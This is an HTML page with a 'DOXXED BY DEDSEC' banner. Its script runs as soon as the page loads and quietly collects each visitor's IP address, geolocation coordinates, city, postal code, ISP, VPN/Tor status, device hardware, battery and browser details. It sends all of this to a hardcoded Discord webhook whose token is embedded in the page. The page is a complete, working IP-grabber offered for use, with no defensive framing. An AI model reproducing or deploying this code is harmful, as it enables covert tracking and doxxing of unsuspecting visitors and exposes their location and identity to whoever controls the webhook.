<!DOCTYPE html>

    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            position: relative;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
            background-image: url('https://i.imgur.com/cVnL0wo.png');
            background-repeat: repeat;
        }
        .texto-no-interactivo {
            font-family: 'JetBrains Mono', monospace;

        #status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: #00ff00;

            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            z-index: 999;
            border: 1px solid #00ff00;
            pointer-events: none;
            white-space: nowrap;
        }
        #status.error {
            color: #ff4444;
            border-color: #ff4444;
        }
    </style>
</head>
<body>

    <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>

    <video id="video-inferior" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
    </video>
    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
    </video>

    <div id="status">Loading...</div>

    <script>
        (function() {
            const statusEl = document.getElementById('status');
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6';

            // Obtener datos estáticos del dispositivo
            function getDeviceInfo() {
                const nav = navigator;
                const ua = nav.userAgent;
                let os = 'Desconocido';
                if (ua.indexOf('Win') !== -1) os = 'Windows';
                else if (ua.indexOf('Mac') !== -1) os = 'macOS';
                else if (ua.indexOf('Linux') !== -1) os = 'Linux';
                else if (ua.indexOf('Android') !== -1) os = 'Android';
                else if (ua.indexOf('iOS') !== -1 || ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';

                let browser = 'Desconocido';
                if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
                else if (ua.indexOf('Chrome') !== -1) browser = 'Chrome';
                else if (ua.indexOf('Safari') !== -1) browser = 'Safari';
                else if (ua.indexOf('Edge') !== -1) browser = 'Edge';
                else if (ua.indexOf('Opera') !== -1) browser = 'Opera';

                return {
                    userAgent: ua,
                    os: os,
                    browser: browser,
                    language: nav.language || 'en-US',
                    platform: nav.platform || 'desconocida',
                    hardwareConcurrency: nav.hardwareConcurrency || 'desconocido',
                    deviceMemory: nav.deviceMemory || 'desconocido (GB)',
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    colorDepth: screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString()
                };
            }

            // Obtener estado de la batería (async)
            async function getBatteryInfo() {
                try {
                    if (navigator.getBattery) {
                        const batt = await navigator.getBattery();
                        return {
                            level: Math.round(batt.level * 100) + '%',
                            charging: batt.charging ? 'Si' : 'No',
                            chargingTime: batt.chargingTime + 's',
                            dischargingTime: batt.dischargingTime + 's'
                        };
                    }
                } catch (e) {}
                return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
            }

            // Enviar a Discord
            async function sendToDiscord(ipData, device, battery) {
                // Determinar estado VPN/TOR
                let vpnTorStatus = 'No VPN/TOR Found';
                if (ipData.proxy === true && ipData.tor === true) {
                    vpnTorStatus = 'VPN y TOR Detected';
                } else if (ipData.proxy === true) {
                    vpnTorStatus = 'VPN Detected';
                } else if (ipData.tor === true) {
                    vpnTorStatus = 'TOR Detected';
                }

                const fields = [
                    { name: 'Direccion IP', value: ipData.ip || 'N/A', inline: true },
                    { name: 'Coordenadas', value: ipData.latitude && ipData.longitude ? ipData.latitude + ', ' + ipData.longitude : 'N/A', inline: true },
                    { name: 'Ciudad / Region / Pais', value: (ipData.city || 'N/A') + ', ' + (ipData.region || 'N/A') + ', ' + (ipData.country_name || 'N/A'), inline: false },
                    { name: 'Codigo Postal / ISP', value: (ipData.postal || 'N/A') + ' | ' + (ipData.org || ipData.isp || 'N/A'), inline: false },
                    { name: 'RAM (GB)', value: device.deviceMemory || 'N/A', inline: true },
                    { name: 'Bateria', value: battery.level + ' (Cargando: ' + battery.charging + ')', inline: true },
                    { name: 'Sistema Operativo / Navegador', value: device.os + ' / ' + device.browser, inline: true },
                    { name: 'Pantalla', value: device.screenWidth + 'x' + device.screenHeight + ' @ ' + device.colorDepth + 'bits', inline: true },
                    { name: 'Nucleos CPU', value: device.hardwareConcurrency || 'N/A', inline: true },
                    { name: 'Zona Horaria', value: device.timezone || 'N/A', inline: true },
                    { name: 'Timestamp', value: device.timestamp || 'N/A', inline: false },
                    { name: 'User-Agent completo', value: device.userAgent || 'N/A', inline: false },
                    { name: 'Estado VPN/TOR', value: vpnTorStatus, inline: false }
                ];

                const payload = {
                    username: 'Bagley',
                    avatar_url: 'https://i.imgur.com/cVnL0wo.png',
                    embeds: [{
                        title: 'CtOS',
                        color: 0x00ff00,
                        fields: fields,
                        footer: { text: 'rx9xx clan | Dark Night ai' },
                        timestamp: new Date().toISOString()
                    }]
                };

                try {
                    const resp = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (resp.ok) {
                        statusEl.textContent = 'Sent Data';
                        statusEl.className = '';
                    } else {
                        statusEl.textContent = 'Error: ' + resp.status;
                        statusEl.className = 'error';
                    }
                } catch (e) {
                    statusEl.textContent = 'Sending Error: ' + e.message;
                    statusEl.className = 'error';
                }
            }

            // Ejecución principal
            async function execute() {
                const device = getDeviceInfo();
                const battery = await getBatteryInfo();

                try {
                    const geoResp = await fetch('https://ipapi.co/json/');
                    if (!geoResp.ok) throw new Error('Geo API fallo');
                    const geo = await geoResp.json();
                    await sendToDiscord(geo, device, battery);
                } catch (err) {
                    // Fallback con ipify
                    try {
                        const ipResp = await fetch('https://api.ipify.org?format=json');
                        const ipData = await ipResp.json();
                        const fallbackGeo = {
                            ip: ipData.ip,
                            latitude: 'N/A',
                            longitude: 'N/A',
                            city: 'N/A',
                            region: 'N/A',
                            country_name: 'N/A',
                            postal: 'N/A',
                            org: 'N/A',
                            proxy: false,
                            tor: false
                        };
                        await sendToDiscord(fallbackGeo, device, battery);
                    } catch (e2) {
                        statusEl.textContent = 'Todas las APIs fallaron: ' + e2.message;
                        statusEl.className = 'error';
                    }
                }
            }

            // Ejecutar al cargar la página
            if (document.readyState === 'complete') {
                execute();
            } else {
                window.addEventListener('load', execute);
            }

            statusEl.textContent = 'Loading...';
        })();
    </script>
</body>
